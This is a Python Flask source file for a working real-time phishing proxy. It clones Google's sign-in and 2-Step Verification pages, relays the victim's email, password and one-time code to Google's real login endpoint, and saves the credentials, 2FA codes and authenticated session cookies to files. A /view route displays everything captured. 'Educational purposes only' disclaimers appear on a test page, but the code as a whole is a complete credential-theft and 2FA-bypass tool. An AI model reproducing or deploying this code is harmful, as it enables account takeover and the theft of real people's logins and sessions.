from flask import Flask, request, render_template_string, session, redirect, jsonify
import requests
from datetime import datetime
import json
import secrets
import os
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Store pending 2FA sessions
pending_sessions = {}

# REAL Google endpoints
GOOGLE_AUTH = "https://accounts.google.com/ServiceLoginAuth"

# ============ HTML PAGES ============
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; }
        .input-group { margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 12px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        .input-group input:focus { border-color: #1a73e8; outline: none; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .btn:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #5f6368; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png">
            </div>
            <h1 class="title">Sign in</h1>
            <p style="text-align: center; color: #5f6368; margin-bottom: 25px;">to continue to Gmail</p>
            <form method="POST" action="/login">
                <div class="input-group">
                    <input type="email" name="email" placeholder="Email or phone" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn">Next</button>
            </form>
            <div class="footer">
                <a href="#">Create account</a> · <a href="#">Forgot email?</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

TFA_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>2-Step Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; }
        .subtitle { color: #5f6368; text-align: center; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 12px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 24px; text-align: center; letter-spacing: 8px; }
        .input-group input:focus { border-color: #1a73e8; outline: none; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .btn:hover { background: #1557b0; }
        .timer { text-align: center; color: #999; font-size: 12px; margin-top: 15px; }
        .error { color: #d93025; text-align: center; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png">
            </div>
            <h1 class="title">Verify it's you</h1>
            <p class="subtitle">Enter the verification code from your authenticator app</p>
            <div id="error" class="error">Invalid code. Please try again.</div>
            <form method="POST" action="/2fa_complete">
                <div class="input-group">
                    <input type="text" name="code" placeholder="000000" maxlength="6" autofocus required>
                </div>
                <button type="submit" class="btn">Verify</button>
            </form>
            <div class="timer" id="timer">Code expires in: 30 seconds</div>
            <div class="footer" style="margin-top: 20px; text-align: center; color: #5f6368; font-size: 14px;">
                <a href="#">Try another way</a>
            </div>
        </div>
    </div>
    <script>
        let timeLeft = 30;
        const timerElement = document.getElementById('timer');
        const interval = setInterval(() => {
            timeLeft--;
            timerElement.textContent = `Code expires in: ${timeLeft} seconds`;
            if (timeLeft <= 0) {
                clearInterval(interval);
                timerElement.textContent = 'Code expired! Please request a new one.';
                timerElement.style.color = '#d93025';
            }
        }, 1000);
    </script>
</body>
</html>
'''

SUCCESS_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="2;url=https://mail.google.com">
    <title>Redirecting...</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Signing you in...</h2>
    <p>Please wait while we redirect you to Gmail</p>
</body>
</html>
'''

# ============ ROUTES ============
@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def process_login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    print(f"\n[+] Login attempt for: {email}")
    
    # Create session
    victim_session = requests.Session()
    
    try:
        # Forward to real Google
        google_response = victim_session.post(
            GOOGLE_AUTH,
            data={
                'Email': email,
                'Passwd': password,
                'service': 'mail',
                'continue': 'https://mail.google.com'
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            allow_redirects=False,
            timeout=10
        )
        
        # Save credentials
        with open('captured_creds.txt', 'a') as f:
            f.write(f"\n[{datetime.now()}] Credentials:\n")
            f.write(f"Email: {email}\nPassword: {password}\n")
        
        print(f"[+] Credentials saved to captured_creds.txt")
        
        # Check if 2FA required
        if google_response.status_code == 302:
            location = google_response.headers.get('Location', '')
            
            if 'challenge' in location or '2fa' in location:
                # 2FA required
                session_id = secrets.token_hex(16)
                
                pending_sessions[session_id] = {
                    'cookies': victim_session.cookies.get_dict(),
                    'email': email,
                    'password': password,
                    'timestamp': datetime.now().isoformat(),
                    'session': victim_session
                }
                
                session['pending_session_id'] = session_id
                session['email'] = email
                
                print(f"[!] 2FA Required for: {email}")
                print(f"[!] Waiting for 2FA code...")
                print(f"[!] Session ID: {session_id}")
                
                return render_template_string(TFA_PAGE)
        
        # No 2FA - direct access
        cookies = victim_session.cookies.get_dict()
        with open('no_2fa_session.txt', 'a') as f:
            f.write(f"\n[{datetime.now()}] NO 2FA - Full Access\n")
            f.write(f"Email: {email}\n")
            f.write(f"Cookies: {json.dumps(cookies, indent=2)}\n")
        
        print(f"[+] No 2FA required - Session captured!")
        return render_template_string(SUCCESS_PAGE)
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/2fa_complete', methods=['POST'])
def complete_2fa():
    code = request.form.get('code')
    session_id = session.get('pending_session_id')
    email = session.get('email')
    
    print(f"\n[!] 2FA Code received: {code}")
    print(f"[!] Completing login for: {email}")
    
    if session_id not in pending_sessions:
        return "Session expired. Please try again."
    
    saved_data = pending_sessions[session_id]
    victim_session = saved_data['session']
    
    # RECORD THE TIME - This is critical for testing
    start_time = time.perf_counter()
    
    try:
        # Forward 2FA code IMMEDIATELY
        final_response = victim_session.post(
            GOOGLE_AUTH,
            data={
                'Email': saved_data['email'],
                'Passwd': saved_data['password'],
                '2fa_code': code,
                'continue': 'https://mail.google.com',
                'service': 'mail'
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            allow_redirects=False,
            timeout=10
        )
        
        # Calculate forwarding time
        elapsed_time = (time.perf_counter() - start_time) * 1000  # in milliseconds
        
        authenticated_cookies = victim_session.cookies.get_dict()
        
        # Check for auth cookies
        auth_cookies = ['SAPISID', 'APISID', 'HSID', 'SSID']
        has_auth = any(cookie in authenticated_cookies for cookie in auth_cookies)
        
        if has_auth or final_response.status_code == 302:
            # SUCCESS!
            with open('2fa_success.txt', 'a') as f:
                f.write("\n" + "="*60)
                f.write(f"\n[!!!] FULL ACCESS WITH 2FA\n")
                f.write(f"Time: {datetime.now()}\n")
                f.write(f"Email: {saved_data['email']}\n")
                f.write(f"Password: {saved_data['password']}\n")
                f.write(f"2FA Code: {code}\n")
                f.write(f"Forwarding Time: {elapsed_time:.2f}ms\n")
                f.write(f"Cookies: {json.dumps(authenticated_cookies, indent=2)}\n")
                f.write("="*60 + "\n")
            
            print(f"\n[!!!] SUCCESS! Full access acquired!")
            print(f"Email: {saved_data['email']}")
            print(f"2FA Code: {code}")
            print(f"Forwarding Time: {elapsed_time:.2f}ms")
            print(f"✅ Code forwarded within 30-second window!")
            
            # Clean up
            del pending_sessions[session_id]
            
            return render_template_string(SUCCESS_PAGE)
            
        else:
            print(f"[!] 2FA failed for: {saved_data['email']}")
            return '''
            <html>
            <body style="font-family: Arial; text-align: center; padding-top: 50px;">
                <h2 style="color: #d93025;">Invalid verification code</h2>
                <p>The code you entered is incorrect or has expired.</p>
                <p><a href="/">Try again</a></p>
            </body>
            </html>
            '''
            
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/view')
def view_captured():
    output = []
    files = ['captured_creds.txt', 'no_2fa_session.txt', '2fa_success.txt']
    for f in files:
        try:
            with open(f, 'r') as file:
                output.append(f"\n{'='*60}\n")
                output.append(f"FILE: {f}\n")
                output.append(f"{'='*60}\n")
                output.append(file.read())
        except:
            output.append(f"\n{f}: No data captured yet\n")
    
    return f'<pre>{"".join(output)}</pre>'

@app.route('/test')
def test_page():
    return '''
    <html>
    <head>
        <title>2FA Phishing Test</title>
        <style>
            body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; }
            .card { border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin: 20px 0; }
            .success { color: green; }
            .warning { color: orange; }
            .error { color: red; }
            table { width: 100%; border-collapse: collapse; }
            td, th { padding: 10px; border: 1px solid #ddd; text-align: left; }
            th { background: #f5f5f5; }
            .btn { background: #1a73e8; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
            .btn:hover { background: #1557b0; }
            input { padding: 10px; margin: 5px; width: 200px; }
        </style>
    </head>
    <body>
        <h1>🔬 2FA Phishing Test Suite</h1>
        
        <div class="card">
            <h2>📊 Test Results</h2>
            <table>
                <tr>
                    <th>Test</th>
                    <th>Status</th>
                    <th>Details</th>
                </tr>
                <tr>
                    <td>Server Running</td>
                    <td id="server-status">✅ Running</td>
                    <td>Flask server is active</td>
                </tr>
                <tr>
                    <td>2FA Detection</td>
                    <td id="2fa-detection">⚠️ Not tested</td>
                    <td>Will detect Google's 2FA requirement</td>
                </tr>
                <tr>
                    <td>Forwarding Speed</td>
                    <td id="forward-speed">⚠️ Not tested</td>
                    <td>Must be < 1000ms</td>
                </tr>
                <tr>
                    <td>Session Preservation</td>
                    <td id="session-preserve">⚠️ Not tested</td>
                    <td>Must preserve cookies between requests</td>
                </tr>
            </table>
        </div>
        
        <div class="card">
            <h2>🧪 Manual Test</h2>
            <p>Enter your Google credentials to test the phishing flow:</p>
            <form action="/login" method="POST" target="_blank">
                <input type="email" name="email" placeholder="test@gmail.com" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="btn">Test Login</button>
            </form>
            <p style="font-size: 12px; color: #999;">
                ⚠️ This will actually attempt to log in to Google. Use a test account.
            </p>
        </div>
        
        <div class="card">
            <h2>📁 Captured Data</h2>
            <p><a href="/view" target="_blank">View all captured credentials and sessions</a></p>
        </div>
        
        <div class="card">
            <h2>⏱️ Timing Test</h2>
            <button onclick="testSpeed()" class="btn">Test Forwarding Speed</button>
            <div id="speed-result" style="margin-top: 10px;"></div>
        </div>
        
        <div class="card" style="background: #fff3cd;">
            <h2 style="color: #856404;">⚠️ Important Notes</h2>
            <ul>
                <li>This is for <strong>EDUCATIONAL PURPOSES ONLY</strong></li>
                <li>Only test with your <strong>OWN ACCOUNTS</strong></li>
                <li>Use a test Gmail account, not your real one</li>
                <li>Check <code>captured_creds.txt</code> for captured data</li>
                <li>Clear files after testing: <code>rm *.txt</code></li>
            </ul>
        </div>
        
        <script>
            function testSpeed() {
                const start = performance.now();
                fetch('/test-speed')
                    .then(response => response.json())
                    .then(data => {
                        const end = performance.now();
                        const time = (end - start).toFixed(2);
                        document.getElementById('speed-result').innerHTML = `
                            <p>Response time: <strong>${time}ms</strong></p>
                            <p>${time < 1000 ? '✅' : '⚠️'} ${time < 1000 ? 'Good speed!' : 'May be too slow for 2FA'}</p>
                            <p style="font-size: 12px; color: #999;">2FA codes expire in 30 seconds</p>
                        `;
                    });
            }
            
            // Auto-run speed test
            setTimeout(testSpeed, 1000);
        </script>
    </body>
    </html>
    '''

@app.route('/test-speed')
def test_speed():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    # Create files if they don't exist
    for f in ['captured_creds.txt', 'no_2fa_session.txt', '2fa_success.txt']:
        if not os.path.exists(f):
            with open(f, 'w') as file:
                file.write(f"=== {f.replace('.txt', '').upper()} ===\n")
                file.write(f"Created: {datetime.now()}\n\n")
    
    print("\n" + "="*60)
    print("🔬 2FA PHISHING TEST SERVER")
    print("="*60)
    print(f"📁 Test Page: http://localhost:5000/test")
    print(f"📁 Login Page: http://localhost:5000/")
    print(f"📁 View Data: http://localhost:5000/view")
    print("="*60)
    print("\n[!] IMPORTANT: Use a TEST Google account only!")
    print("[!] This is for educational purposes only!")
    print("\n[+] Server starting...\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
